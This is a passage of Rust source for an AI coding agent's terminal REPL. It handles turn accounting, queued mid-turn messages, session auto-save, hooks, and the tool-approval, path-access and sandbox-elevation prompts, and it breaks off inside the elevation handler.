            Event::TurnComplete {
                usage,
                status,
                error,
                tool_catalog,
                base_url,
                reported_model,
                failed_attempts,
            } => {
                view.clear_live();
                // Snapshot the per-turn figures before the accounting pass
                // consumes them — the turn_end hook payload reports them
                // after state, usage, and cost have settled (contract).
                let (turn_input_tokens, turn_output_tokens) =
                    (usage.input_tokens, usage.output_tokens);
                let turn_duration_secs = state
                    .turn_started_at
                    .map(|started| started.elapsed().as_secs_f64())
                    .unwrap_or_default();
                let turn_error = error.clone();
                // Round-3 TODO-42 — log-only bookkeeping: fold this turn's
                // failed model rounds into the session accumulator BEFORE
                // the turn-boundary persist below copies it onto
                // `SavedSession`. Never enters `api_messages`.
                state.failed_attempts.extend(failed_attempts);
                apply_turn_accounting(
                    state,
                    usage,
                    status,
                    error,
                    tool_catalog,
                    base_url,
                    reported_model,
                );
                // The turn boundary is the catch-up read for the 🤖 count: a
                // child cancelled or aborted with the turn never fires its
                // completion event, so the record would otherwise keep
                // reading as running.
                refresh_subagent_cache(state, &engine).await;
                if status != TurnOutcomeStatus::Completed {
                    // The plan handoff dies with a turn that did not finish:
                    // firing the implementation kickoff after a cancel or a
                    // failure would act on an approval the session abandoned.
                    state.plan_implementation_pending = false;
                }
                state.is_loading = false;
                state.turn_started_at = None;
                persist_session_turn_boundary(state);
                emit_turn_end_hooks(
                    state,
                    status,
                    turn_error.as_deref(),
                    turn_input_tokens,
                    turn_output_tokens,
                    turn_duration_secs,
                );
                carry_composer_out(state, &mut view);
                return Ok(PumpExit::TurnDone);
            }
            Event::CycleAdvanced { .. }
            | Event::CoherenceState { .. }
            | Event::CapacityDecision { .. }
            | Event::CapacityIntervention { .. }
            | Event::CapacityMemoryPersistFailed { .. }
            | Event::PrefixCacheChange { .. }
            | Event::ResultVerification { .. }
            | Event::TranscriptRebuilt { .. }
            | Event::BackgroundTaskStarted { .. }
            | Event::BackgroundTaskNotification { .. } => {}
        }
    }
}

fn error_envelope_message(envelope: &ErrorEnvelope) -> String {
    // `ErrorEnvelope` renders through its Display in the engine; the REPL
    // only needs the human-readable line.
    envelope.to_string()
}

/// One mid-turn key press.
///
/// Typing and editing touch only the composer; the keys that act (Enter,
/// send-now, Escape, Ctrl+B, Ctrl+X Ctrl+K, Ctrl+O, Ctrl+T) print and talk
/// to the engine, so they clear the live region first — permanent output
/// must never share a row with it.
async fn handle_turn_key(
    state: &mut ReplState,
    view: &mut TurnView,
    key: TurnKey,
    engine: &crate::core::engine::EngineHandle,
) {
    match key {
        TurnKey::Char('\0') => {} // consumed sequence with no composer meaning
        TurnKey::Char(c) => {
            view.composer.insert(c);
            redraw_region(state, view);
        }
        TurnKey::Newline => {
            view.composer.insert('\n');
            redraw_region(state, view);
        }
        TurnKey::Backspace => {
            view.composer.backspace();
            redraw_region(state, view);
        }
        TurnKey::Delete => {
            view.composer.delete();
            redraw_region(state, view);
        }
        TurnKey::Left => {
            view.composer.move_left();
            redraw_region(state, view);
        }
        TurnKey::Right => {
            view.composer.move_right();
            redraw_region(state, view);
        }
        TurnKey::Home => {
            view.composer.move_home();
            redraw_region(state, view);
        }
        TurnKey::End => {
            view.composer.move_end();
            redraw_region(state, view);
        }
        TurnKey::Up => {
            // Claude Code's "take back what you queued": with an empty
            // composer, Up pulls the newest queued message back for editing.
            if view.composer.is_empty()
                && let Some(last) = state.queued_messages.pop()
            {
                view.composer.buffer = last;
                view.composer.cursor = view.composer.buffer.len();
                view.clear_live();
                println!("{}", "↑ took back the newest queued message".dimmed());
                return;
            }
            redraw_region(state, view);
        }
        TurnKey::Down => {
            // No composer history mid-turn; the key is consumed so it cannot
            // leak into the buffer.
        }
        TurnKey::KillToEnd | TurnKey::KillToStart | TurnKey::KillWord => {
            // The killed text goes nowhere: there is no kill ring mid-turn,
            // and a composer is short-lived. Claude Code's Ctrl+Y ring is a
            // prompt-time affordance here.
            match key {
                TurnKey::KillToEnd => drop(view.composer.kill_to_end()),
                TurnKey::KillToStart => drop(view.composer.kill_to_start()),
                _ => drop(view.composer.kill_word()),
            }
            redraw_region(state, view);
        }
        TurnKey::Queue => {
            let text = view.composer.take();
            if text.trim().is_empty() {
                redraw_region(state, view);
                return;
            }
            state.queued_messages.push(text.clone());
            view.clear_live();
            println!(
                "{}",
                queued_line(&text, state.queued_messages.len()).dimmed()
            );
            // Round-7 TODO-48 — queue text is durable the moment it is
            // queued (after clear_live, so the failure warning can never
            // share a row with the live region).
            super::inbox_journal::journal_enqueue(state, &text);
        }
        TurnKey::SendNow => {
            let text = view.composer.take();
            if !text.trim().is_empty() {
                state.queued_messages.push(text.clone());
                view.clear_live();
                // Round-7 TODO-48 — durable before the flush tries to
                // deliver it: the entry outlives the steer attempt (a
                // failed steer re-queues the text) and is dropped only when
                // the turn that consumed it persists.
                super::inbox_journal::journal_enqueue(state, &text);
            }
            flush_queue_into_turn(state, view, engine).await;
        }
        TurnKey::ToggleDetail => {
            state.tool_detail = !state.tool_detail;
            view.clear_live();
            if state.tool_detail {
                println!("{}", "— tool detail expanded (Ctrl+O to collapse)".dimmed());
                replay_turn_tool_detail(state);
            } else {
                println!("{}", "— tool detail collapsed (Ctrl+O to expand)".dimmed());
            }
        }
        TurnKey::TaskList => {
            state.show_tasks = !state.show_tasks;
            view.clear_live();
            if state.show_tasks {
                super::print_task_list(state).await;
            } else {
                println!("{}", "— task list hidden (Ctrl+T)".dimmed());
            }
        }
        TurnKey::CycleMode => {
            state.cycle_mode();
            view.clear_live();
            println!(
                "{}",
                format!(
                    "switched to {} mode — applies from the next turn",
                    state.mode.label()
                )
                .dimmed()
            );
        }
        TurnKey::Background => {
            view.clear_live();
            let _ = engine.send(Op::BackgroundCurrentShell).await;
            println!("{}", "— backgrounding the running shell (Ctrl+B)".dimmed());
        }
        TurnKey::StopAll => {
            let now = Instant::now();
            let confirmed = view
                .stop_all_at
                .is_some_and(|at| now.duration_since(at) <= STOP_ALL_WINDOW);
            view.stop_all_at = Some(now);
            view.clear_live();
            if confirmed {
                let _ = engine.send(Op::CancelAllBackgroundTasks).await;
                println!("{}", "— stopping all background work".yellow());
            } else {
                println!(
                    "{}",
                    "— press Ctrl+X Ctrl+K again within 3 seconds to stop all background work"
                        .dimmed()
                );
            }
        }
        TurnKey::Esc => {
            view.clear_live();
            // Claude Code's rule: work that can move to the background does,
            // and the model keeps reading; only otherwise does Escape
            // interrupt the turn. Anything already queued goes out either
            // way (a steer when the turn lives on, the next turn when it
            // does not).
            let backgroundable = view
                .current_tool
                .as_deref()
                .is_some_and(is_backgroundable_tool);
            if backgroundable {
                let _ = engine.send(Op::BackgroundCurrentShell).await;
                println!("{}", "⎋ — sent the running tool to the background".dimmed());
                flush_queue_into_turn(state, view, engine).await;
            } else {
                engine.cancel();
                let queued = state.queued_messages.len();
                if queued > 0 {
                    println!(
                        "{}",
                        format!("⎋ interrupted — {queued} queued message(s) go out next").yellow()
                    );
                } else {
                    println!("{}", "⎋ interrupted".yellow());
                }
            }
        }
    }
}

/// Tools whose work can be detached from the turn: a shell command keeps
/// running in the background, and a sub-agent has its own task.
fn is_backgroundable_tool(name: &str) -> bool {
    name.starts_with("exec_shell") || name.starts_with("agent_")
}

/// Re-read the live sub-agent record into `state.subagent_cache` — the input
/// of the 🤖 segment and `/agents`.
///
/// A direct read of the manager the engine host shares with the spawn tools,
/// not a list request through the engine: the engine drains its op channel
/// only *between* turns, so a request sent from here would be answered after
/// the child it was meant to reveal had already finished, and the count sat
/// at `🤖0` the whole time a child was running. The record stays the source
/// — only the request path changed.
async fn refresh_subagent_cache(state: &mut ReplState, engine: &crate::core::engine::EngineHandle) {
    state.subagent_cache = engine.subagent_api.list().await;
}

/// Redraw the live region after a composer edit, using the status line the
/// ticker would draw (so the composer row keeps its place without waiting
/// for the next tick).
fn redraw_region(state: &ReplState, view: &mut TurnView) {
    let frame = super::status::live_line(state, view.current_tool.as_deref());
    view.draw_live(&frame);
}

/// The dim line a queued message prints as.
fn queued_line(text: &str, pending: usize) -> String {
    let first = text.lines().next().unwrap_or(text);
    let more = text.lines().count().saturating_sub(1);
    let ellipsis = if more > 0 {
        format!(" (+{more} more line(s))")
    } else {
        String::new()
    };
    format!("⏸ queued ({pending} pending): {first}{ellipsis}")
}

/// Hand every queued message to the running turn, in the order typed.
///
/// `EngineHandle::steer` is the engine's mid-turn input path: the executor
/// drains it at the next step boundary and records it as a user message, so
/// the session log keeps agreeing with what the model saw.
async fn flush_queue_into_turn(
    state: &mut ReplState,
    view: &mut TurnView,
    engine: &crate::core::engine::EngineHandle,
) {
    if state.queued_messages.is_empty() {
        return;
    }
    let sent: Vec<String> = state.queued_messages.drain(..).collect();
    view.clear_live();
    for text in &sent {
        if let Err(err) = engine.steer(text.clone()).await {
            println!(
                "{}",
                format!("✗ could not deliver a queued message: {err}").red()
            );
            // Nothing is lost: the message goes back on the queue and the
            // REPL sends it as the next turn.
            state.queued_messages.push(text.clone());
        }
    }
    if sent.len() > state.queued_messages.len() {
        println!(
            "{}",
            format!(
                "→ sent {} queued message(s) to the running turn",
                sent.len()
            )
            .dimmed()
        );
    }
}

/// Carry whatever the user was typing mid-turn out to the prompt.
///
/// The composer dies with the turn, and losing a half-typed message to a turn
/// that happened to end first would feel like the input vanished; the REPL
/// loop picks this up as the next prompt's text.
fn carry_composer_out(state: &mut ReplState, view: &mut TurnView) {
    if view.composer.is_empty() {
        return;
    }
    let text = view.composer.take();
    view.clear_live();
    state.turn_end_draft = Some(text);
}

/// Record a completed call in the session tool log (`/expand` replay),
/// dropping the oldest entries past the cap.
fn push_tool_record(
    state: &mut ReplState,
    name: &str,
    args_summary: Option<String>,
    output: Option<String>,
    error: Option<String>,
) {
    state.tool_log.push(crate::tool_summary::ToolCallRecord {
        seq: state.tool_log.len() + 1,
        turn: state.tool_log_turn,
        name: name.to_string(),
        args_summary,
        output,
        error,
        replayed: false,
    });
    let overflow = state
        .tool_log
        .len()
        .saturating_sub(crate::tool_summary::TOOL_LOG_CAP);
    if overflow > 0 {
        state.tool_log.drain(..overflow);
    }
}

/// Reprint detail for the current turn's collapsed tool calls (the Ctrl+O
/// expand path). Already-replayed calls are skipped so toggling more than
/// once never duplicates output.
pub(super) fn replay_turn_tool_detail(state: &mut ReplState) {
    let turn = state.tool_log_turn;
    let mut blocks = Vec::new();
    for record in state.tool_log.iter_mut() {
        if record.turn == turn && !record.replayed {
            blocks.push(crate::tool_summary::tool_detail_block(
                record,
                crate::tool_summary::DETAIL_MAX_LINES,
            ));
            record.replayed = true;
        }
    }
    for block in blocks {
        println!("{}", block.dimmed());
    }
}

/// Auto-save the session at each turn boundary (the retired TUI's
/// persistence-actor contract, reduced to the turn boundary). Failures are
/// silent-by-print: a save miss never interrupts the conversation.
fn persist_session_turn_boundary(state: &mut ReplState) {
    let Some(session) = saved_session_from_state(state) else {
        return;
    };
    let Ok(manager) = crate::session_manager::SessionManager::default_location() else {
        return;
    };
    if let Err(err) = manager.save_session(&session) {
        println!(
            "{}",
            format!("warning: could not auto-save session: {err}").yellow()
        );
        return;
    }
    // Adopt the id so subsequent turns update the same session file
    // instead of minting a new one per turn.
    state.current_session_id = Some(session.metadata.id.clone());
    // Round-7 TODO-48 — the finished turn is now the durable record, so the
    // inbox journal mirrors the live queue again: entries the turn consumed
    // are dropped, anything still queued survives the next crash.
    super::inbox_journal::mirror_after_persist(state, manager.sessions_dir());
    // The turn is over and the regular session file is now the durable
    // record, so the in-flight crash-recovery checkpoint is redundant.
    let _ = manager.clear_checkpoint();
}

/// Snapshot the session as it stands at turn start, so a crash mid-turn is
/// recoverable on the next launch (`load_checkpoint` path). Best-effort and
/// silent: a checkpoint miss must never interrupt a running turn.
fn save_crash_recovery_checkpoint(state: &ReplState) {
    let Some(session) = saved_session_from_state(state) else {
        return;
    };
    let Ok(manager) = crate::session_manager::SessionManager::default_location() else {
        return;
    };
    let _ = manager.save_checkpoint(&session);
}

/// Build the persistable session record from REPL state, or `None` when
/// there is nothing worth persisting yet.
fn saved_session_from_state(state: &ReplState) -> Option<crate::session_manager::SavedSession> {
    use crate::session_manager::create_saved_session_with_id_and_mode;

    if state.api_messages.is_empty() {
        return None;
    }
    let session_id = state
        .current_session_id
        .clone()
        .unwrap_or_else(|| uuid::Uuid::new_v4().to_string());
    let mut session = create_saved_session_with_id_and_mode(
        session_id,
        &state.api_messages,
        &state.model,
        &state.workspace,
        u64::from(state.session.total_tokens),
        state.system_prompt.as_ref(),
        Some(state.mode.label()),
    );
    session.metadata.cost.session_cost_usd = state.session.session_cost;
    session.metadata.cost.session_cost_cny = state.session.session_cost_cny;
    session.metadata.cost.subagent_cost_usd = state.session.subagent_cost;
    session.metadata.cost.subagent_cost_cny = state.session.subagent_cost_cny;
    session.metadata.cumulative_turn_secs = state.cumulative_turn_duration.as_secs();
    // Keep the persisted record in agreement with state: the `MessageStart`
    // model name alongside the requested id.
    session.metadata.reported_model = state.reported_model.clone();
    // Round-3 TODO-42 — failed-attempt bookkeeping rides the session record
    // (log-only; the constructor starts it empty, state owns the accumulate).
    session.failed_attempts = state.failed_attempts.clone();
    // Same contract for the approval record: it is the only place the
    // session can say what the user actually agreed to, asked or not.
    session.approvals = state.approvals.clone();
    // TODO-50 — the media attachment record: which images reached the model
    // (store path + hash) and which were refused, per message.
    session.context_references = state.context_references.clone();
    Some(session)
}

/// Fire the observer `turn_end` hook (every outcome) and `on_error` (failed
/// turns) after turn accounting and persistence have settled. Detached —
/// the REPL does not wait on hook processes between turns.
fn emit_turn_end_hooks(
    state: &ReplState,
    status: TurnOutcomeStatus,
    error: Option<&str>,
    input_tokens: u32,
    output_tokens: u32,
    duration_secs: f64,
) {
    if state.hooks.has_hooks_for_event(HookEvent::TurnEnd) {
        let context = state
            .hook_context()
            .with_turn_status(turn_status_str(status))
            .with_input_tokens(input_tokens)
            .with_output_tokens(output_tokens)
            .with_duration_secs(duration_secs);
        crate::hooks::emit_detached(
            std::sync::Arc::new(state.hooks.clone()),
            HookEvent::TurnEnd,
            context,
        );
    }
    if let Some(error) = error
        && status != TurnOutcomeStatus::Completed
        && state.hooks.has_hooks_for_event(HookEvent::OnError)
    {
        let context = state.hook_context().with_error(error);
        crate::hooks::emit_detached(
            std::sync::Arc::new(state.hooks.clone()),
            HookEvent::OnError,
            context,
        );
    }
}

fn turn_status_str(status: TurnOutcomeStatus) -> &'static str {
    match status {
        TurnOutcomeStatus::Completed => "completed",
        TurnOutcomeStatus::Interrupted => "interrupted",
        TurnOutcomeStatus::Failed => "failed",
    }
}

/// Mirror of the retired TurnComplete accounting (ui.rs): token totals,
/// cache telemetry, cost accrual.
fn apply_turn_accounting(
    state: &mut ReplState,
    usage: crate::models::Usage,
    status: TurnOutcomeStatus,
    error: Option<String>,
    tool_catalog: Option<Vec<crate::models::Tool>>,
    base_url: Option<String>,
    reported_model: Option<String>,
) {
    state.session.last_tool_catalog = tool_catalog;
    state.session.last_base_url = base_url;
    // The `MessageStart` model name feeds the status-bar label (and the saved
    // session metadata below); a configured `display_model` overrides it.
    if let Some(reported) = reported_model.as_deref()
        && !reported.is_empty()
    {
        state.reported_model = Some(reported.to_string());
    }

    let turn_elapsed = state
        .turn_started_at
        .map(|started| started.elapsed())
        .unwrap_or_default();
    state.cumulative_turn_duration = state.cumulative_turn_duration.saturating_add(turn_elapsed);

    let turn_tokens = usage.input_tokens + usage.output_tokens;
    state.session.total_tokens = state.session.total_tokens.saturating_add(turn_tokens);
    state.session.total_conversation_tokens = state
        .session
        .total_conversation_tokens
        .saturating_add(turn_tokens);
    state.session.total_input_tokens = state
        .session
        .total_input_tokens
        .saturating_add(usage.input_tokens);
    state.session.total_output_tokens = state
        .session
        .total_output_tokens
        .saturating_add(usage.output_tokens);
    if let Some(hit_tokens) = usage.prompt_cache_hit_tokens {
        state.session.total_cache_hit_tokens = state
            .session
            .total_cache_hit_tokens
            .saturating_add(hit_tokens);
        let cache_miss = usage
            .prompt_cache_miss_tokens
            .unwrap_or_else(|| usage.input_tokens.saturating_sub(hit_tokens));
        state.session.total_cache_miss_tokens = state
            .session
            .total_cache_miss_tokens
            .saturating_add(cache_miss);
    }
    state.session.last_prompt_tokens = Some(usage.input_tokens);
    state.session.last_completion_tokens = Some(usage.output_tokens);
    state.session.last_prompt_cache_hit_tokens = usage.prompt_cache_hit_tokens;
    state.session.last_prompt_cache_miss_tokens = usage.prompt_cache_miss_tokens;
    state.session.last_reasoning_replay_tokens = usage.reasoning_replay_tokens;
    state
        .session
        .turn_cache_history
        .push_back(crate::app_state::TurnCacheRecord {
            input_tokens: usage.input_tokens,
            output_tokens: usage.output_tokens,
            cache_hit_tokens: usage.prompt_cache_hit_tokens,
            cache_miss_tokens: usage.prompt_cache_miss_tokens,
        });

    let pricing_model = if state.auto_model {
        state
            .last_effective_model
            .clone()
            .unwrap_or_else(|| state.model.clone())
    } else {
        state.model.clone()
    };
    if let Some(cost) = codesmith_agent_runtime::pricing::calculate_turn_cost_estimate_from_usage(
        &pricing_model,
        &usage,
    ) {
        state.session.session_cost += cost.usd;
        state.session.session_cost_cny += cost.cny;
    }

    // Background LLM cost accrued since the last turn (compaction summaries,
    // seam recompaction, cycle briefings — #526). The REPL is the pool's one
    // draining consumer; the background bucket keeps it distinguishable from
    // per-turn accrual in the saved session's cost snapshot.
    let background = codesmith_agent_runtime::cost_status::drain();
    if background.is_positive() {
        state.session.subagent_cost += background.usd;
        state.session.subagent_cost_cny += background.cny;
    }

    if let Some(error) = error
        && status != TurnOutcomeStatus::Completed
    {
        println!("{} turn failed: {error}", "✗".red());
    }
}

/// The tool-approval gate: ask, map the answer, answer the engine.
///
/// `[r] <feedback>` — or any line that is not one of the four keys — denies
/// the call and steers the feedback into the running turn as a user message,
/// so the model can revise and ask again. For `exit_plan_mode` that is the
/// re-plan path: the refused call never ran, so plan mode stays active and the
/// plan file is still there to rewrite.
///
/// Known limitation, beside the behaviour it owns: `exit_plan_mode` has no
/// arguments to discriminate on, so its grouping key is the bare tool name — `[a]`
/// at that gate covers every later `exit_plan_mode` in this session, and a
/// revised plan is then approved without a question. A steer is drained at the
/// turn's next step boundary; if the turn ends before one arrives, the host's
/// stale-drain discards it — the same edge the composer's queued messages
/// carry, and the reason the confirmation line says the turn was told, not
/// that the model acted on it.
#[allow(clippy::too_many_arguments)]
async fn handle_approval(
    state: &mut ReplState,
    engine: &crate::core::engine::EngineHandle,
    view: &mut TurnView,
    keys: &mut super::keys::KeyTap,
    id: String,
    tool_name: String,
    description: String,
    input: serde_json::Value,
    approval_key: String,
    approval_grouping_key: String,
    intent_summary: Option<String>,
) {
    view.clear_live();
    let workspace_key = state.workspace.to_string_lossy().into_owned();

    // Every path through this gate leaves a record — the asked and the
    // unasked alike. A session file that cannot say whether a patch was
    // hand-approved or covered by an earlier `[a]` is not a record of what the
    // user agreed to; see `SavedSession::approvals` for what the record does
    // and does not cover.
    if state.approval_mode == ApprovalMode::Auto {
        log_approval(
            state,
            &id,
            &tool_name,
            &approval_key,
            &approval_grouping_key,
            "auto-mode",
            None,
        );
        let _ = engine.approve_tool_call(id).await;
        return;
    }
    if approval_session_denied(
        &state.approval_session_denied,
        &approval_key,
        &approval_grouping_key,
    ) {
        log_approval(
            state,
            &id,
            &tool_name,
            &approval_key,
            &approval_grouping_key,
            "session-deny",
            None,
        );
        let _ = engine.deny_tool_call(id).await;
        return;
    }
    if approval_always_granted(
        &state.approval_session_approved,
        &state.approval_grants,
        &workspace_key,
        &approval_grouping_key,
    ) {
        // Which of the two answered it matters to the reader: a session `[a]`
        // dies with the process, a workspace grant survives a restart.
        let decision = if approval_always_granted(
            &state.approval_session_approved,
            &crate::approval_grants::ApprovalGrants::default(),
            &workspace_key,
            &approval_grouping_key,
        ) {
            "session-grant"
        } else {
            "workspace-grant"
        };
        log_approval(
            state,
            &id,
            &tool_name,
            &approval_key,
            &approval_grouping_key,
            decision,
            None,
        );
        let _ = engine.approve_tool_call(id).await;
        return;
    }

    let args_summary = crate::tool_summary::summarize_tool_args(&input);
    state.awaiting_approval = true;
    // The prompt reads stdin line-by-line; the key tap must let go first.
    keys.suspend();
    // Plan approval is the one place a plan body reaches the user: render the
    // full markdown before the question, so the answer is informed (the
    // plan-mode prompt points the model at the file, not at `update_plan`),
    // and ask the plan gate's own three-way question — the decision is about
    // the plan, not this tool call.
    let plan_gate = tool_name == "exit_plan_mode";
    if plan_gate {
        print!("{}", plan_approval_block(state).await);
        print!("{}", plan_approval_frame());
    } else {
        print!(
            "{}",
            approval_frame(
                &tool_name,
                &description,
                args_summary.as_deref(),
                intent_summary.as_deref(),
                &approval_always_scope(&tool_name, &approval_grouping_key),
            )
        );
    }
    let _ = std::io::stdout().flush();
    // A bare `[r]` re-asks on a fresh line rather than refusing the keypress
    // the user meant as the start of their feedback. EOF reads as an empty
    // line and skips, exactly as it did before the key existed.
    let parse = if plan_gate {
        parse_plan_approval_answer
    } else {
        parse_approval_answer
    };
    let answer = loop {
        match parse(&read_stdin_line("").await) {
            ApprovalAnswer::NeedFeedback => {
                print!("{}", feedback_needed_frame());
                let _ = std::io::stdout().flush();
            }
            answer => break answer,
        }
    };
    keys.resume();
    state.awaiting_approval = false;
    match answer {
        ApprovalAnswer::RunOnce => {
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "run-once",
                None,
            );
            let _ = engine.approve_tool_call(id).await;
        }
        ApprovalAnswer::AlwaysSession => {
            record_always_approved(&mut state.approval_session_approved, &approval_grouping_key);
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "always-session",
                None,
            );
            let _ = engine.approve_tool_call(id).await;
        }
        ApprovalAnswer::Yolo => {
            // `/yolo` spelled from the gate: the mode switch turns on shell +
            // trust + auto-approve, and every later gate this session is then
            // answered by the `ApprovalMode::Auto` checks above. The mode
            // field is set directly too because `set_mode` no-ops when the
            // mode is already Yolo — `/config approval_mode suggest` can
            // re-arm prompts inside it.
            state.set_mode(crate::app_state::AppMode::Yolo);
            state.approval_mode = ApprovalMode::Auto;
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "yolo",
                None,
            );
            println!(
                "{}",
                "→ yolo — shell, trust, and auto-approve on for the rest of this session \
                 (/mode agent to leave)"
                    .dimmed()
            );
            let _ = engine.approve_tool_call(id).await;
        }
        ApprovalAnswer::NeverThis => {
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "never-this",
                None,
            );
            state.approval_session_denied.insert(approval_key);
            let _ = engine.deny_tool_call(id).await;
        }
        ApprovalAnswer::Revise(feedback) => {
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "feedback",
                Some(&feedback),
            );
            // Deny first: the turn is parked on this gate, so the refusal
            // reaches the model as this call's tool error, and the feedback is
            // drained at the next step boundary as a user message — both
            // recorded, in that order.
            let _ = engine.deny_tool_call(id).await;
            match engine.steer(feedback.clone()).await {
                Ok(()) => println!("{}", "→ feedback sent to the running turn".dimmed()),
                Err(err) => {
                    // Nothing is lost: the text goes back on the queue the
                    // REPL drains into the turn, and the failure is not
                    // dressed up as a delivery.
                    println!(
                        "{}",
                        format!("✗ could not deliver the feedback: {err}").red()
                    );
                    state.queued_messages.push(feedback);
                }
            }
        }
        // Unreachable — the prompt loop above consumes it — and refusing is
        // the safe reading if it ever isn't.
        ApprovalAnswer::NeedFeedback | ApprovalAnswer::Skip => {
            log_approval(
                state,
                &id,
                &tool_name,
                &approval_key,
                &approval_grouping_key,
                "skip",
                None,
            );
            let _ = engine.deny_tool_call(id).await;
            // The plan gate's reject is not a silent skip: the turn is told
            // the plan was refused and where to go next, so it revises
            // instead of reading a bare permission error.
            if plan_gate {
                match engine.steer(PLAN_REJECTED_NOTE.to_string()).await {
                    Ok(()) => println!("{}", "→ plan rejected — the turn was told".dimmed()),
                    Err(err) => {
                        println!(
                            "{}",
                            format!("✗ could not deliver the rejection: {err}").red()
                        );
                    }
                }
            }
        }
    }
}

/// Append one approval decision to the session's record.
///
/// The `decision` vocabulary is the one documented on
/// [`ApprovalRecord`](codesmith_agent_runtime::session_store::ApprovalRecord):
/// the four prompt answers, `feedback`, and the four paths that never prompted.
#[allow(clippy::too_many_arguments)]
fn log_approval(
    state: &mut ReplState,
    tool_call_id: &str,
    tool_name: &str,
    approval_key: &str,
    grouping_key: &str,
    decision: &str,
    feedback: Option<&str>,
) {
    let workspace = state.workspace.to_string_lossy().into_owned();
    state
        .approvals
        .push(codesmith_agent_runtime::session_store::ApprovalRecord {
            tool_call_id: tool_call_id.to_string(),
            tool_name: tool_name.to_string(),
            approval_key: approval_key.to_string(),
            grouping_key: grouping_key.to_string(),
            decision: decision.to_string(),
            feedback: feedback.map(str::to_string),
            workspace,
            at: chrono::Utc::now(),
        });
}

/// What a path-access answer does. Split from the prompt because mapping a
/// typed line to (allow, persist) is the security-relevant half, and this way
/// it is testable without stdin.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PathAccessAnswer {
    /// `[y]` — allow it for this turn; the engine grants the path in-process.
    AllowNow,
    /// `[a]` — allow it and remember it for this workspace (the host writes
    /// `~/.codesmith/workspace-trust.json`, the store `/trust add` owns).
    AllowAndRemember,
    /// Everything else, including `[n]` and an empty line — the call stays
    /// refused.
    Decline,
}

fn parse_path_access_answer(raw: &str) -> PathAccessAnswer {
    match raw.trim().to_ascii_lowercase().as_str() {
        "y" | "yes" => PathAccessAnswer::AllowNow,
        "a" | "always" => PathAccessAnswer::AllowAndRemember,
        _ => PathAccessAnswer::Decline,
    }
}

/// The path-access question: a call names a directory outside the workspace.
/// Ends at the unterminated prompt, like [`approval_frame`].
fn path_access_frame(tool_name: &str, path: &std::path::Path) -> String {
    format!(
        "{} path outside the workspace: {} ({})\nallow? [y] allow it now · [a] always allow it \
         in this workspace (saved) · [n] skip: ",
        "⚠".yellow(),
        path.display().to_string().bold(),
        tool_name.bold()
    )
}

/// `Event::PathAccessRequired` — the user decides whether a call may touch a
/// path outside the workspace, instead of the engine refusing it outright.
/// Allowing either way makes the engine grant the path for this turn, so the
/// call that hit the boundary proceeds; `[a]` additionally persists it
/// (`/trust add`'s store), which later turns and sub-agents pick up. Declining
/// keeps the plain refusal.
async fn handle_path_access(
    state: &mut ReplState,
    engine: &crate::core::engine::EngineHandle,
    view: &mut TurnView,
    keys: &mut super::keys::KeyTap,
    id: String,
    tool_name: String,
    path: std::path::PathBuf,
) {
    view.clear_live();
    if state.approval_mode == ApprovalMode::Auto {
        // Same posture as `handle_approval`: an auto session does not stall on
        // prompts. (YOLO never gets here — `trust_mode` short-circuits
        // `resolve_path` before any question exists.)
        let _ = engine.approve_tool_call(id).await;
        return;
    }

    state.awaiting_approval = true;
    // The prompt reads stdin line-by-line; the key tap must let go first.
    keys.suspend();
    print!("{}", path_access_frame(&tool_name, &path));
    let _ = std::io::stdout().flush();
    let answer = read_stdin_line("").await;
    keys.resume();
    state.awaiting_approval = false;

    match parse_path_access_answer(&answer) {
        PathAccessAnswer::AllowNow => {
            let _ = engine.approve_tool_call(id).await;
        }
        PathAccessAnswer::AllowAndRemember => {
            // Persist first: the engine's in-process grant covers this turn,
            // and a failure to write must not silently look like "remembered".
            match crate::workspace_trust::add(&state.workspace, &path) {
                Ok(stored) => println!(
                    "{}",
                    format!(
                        "trusted for this workspace: {} — `/trust remove {}` to undo",
                        stored.display(),
                        stored.display()
                    )
                    .dimmed()
                ),
                Err(err) => println!(
                    "{} could not save the grant ({err}) — allowing it for this run only",
                    "✗".red()
                ),
            }
            let _ = engine.approve_tool_call(id).await;
        }
        PathAccessAnswer::Decline => {
            let _ = engine.deny_tool_call(id).await;
        }
    }
}

async fn handle_user_input(
    _state: &mut ReplState,
    engine: &crate::core::engine::EngineHandle,
    view: &mut TurnView,
    keys: &mut super::keys::KeyTap,
    id: String,
    request: codesmith_agent_runtime::user_input::UserInputRequest,
) {
    use codesmith_agent_runtime::user_input::{UserInputAnswer, UserInputResponse};

    view.clear_live();
    let mut answers = Vec::new();
    for question in &request.questions {
        println!("{} {}", "?".cyan(), question.question);
        for (idx, option) in question.options.iter().enumerate() {
            println!(
                "  {}) {} {}",
                idx + 1,
                option.label,
                format!("— {}", option.description).dimmed()
            );
        }
        keys.suspend();
        let answer = read_stdin_line("choice: ").await;
        keys.resume();
        let picked = answer
            .parse::<usize>()
            .ok()
            .filter(|n| (1..=question.options.len()).contains(n))
            .and_then(|n| question.options.get(n - 1));
        match picked {
            Some(option) => answers.push(UserInputAnswer {
                id: question.id.clone(),
                label: option.label.clone(),
                // `UserInputOption` carries no value field; the label is the
                // value the model round-trips.
                value: option.label.clone(),
            }),
            None => {
                let _ = engine.cancel_user_input(id).await;
                return;
            }
        }
    }
    let _ = engine
        .submit_user_input(id, UserInputResponse { answers })
        .await;
}

#[allow(clippy::too_many_arguments)]
async fn handle_elevation(
    state: &mut ReplState,
    engine: &crate::core::engine::EngineHandle,
    view: &mut TurnView,
    keys: &mut super::keys::KeyTap,
    tool_id: String,
    tool_name: String,
    command: Option<String>,
    denial_reason: String,
) {
    use crate::core::engine::tool_setup::sandbox_policy_for_mode;

    view.clear_live();
    if state.approval_mode == ApprovalMode::Auto {
        // Mirror the retired auto path: strip catastrophic commands;
        // elevate the rest only with the trust/YOLO opt-in.
        let elevation_target = sandbox_policy_for_mode(state.mode, &state.workspace);
        let allow_elevation = state.trust_mode || state.mode == crate::app_state::AppMode::Yolo;
        match crate::auto_mode::decide_auto_elevation(
            command.as_deref(),
            allow_elevation,
            elevation_target,
        ) {
            crate::auto_mode::AutoElevationDecision::Deny { reason } => {
                println!("{} sandbox denied {tool_name}: {reason}", "⚠".yellow());
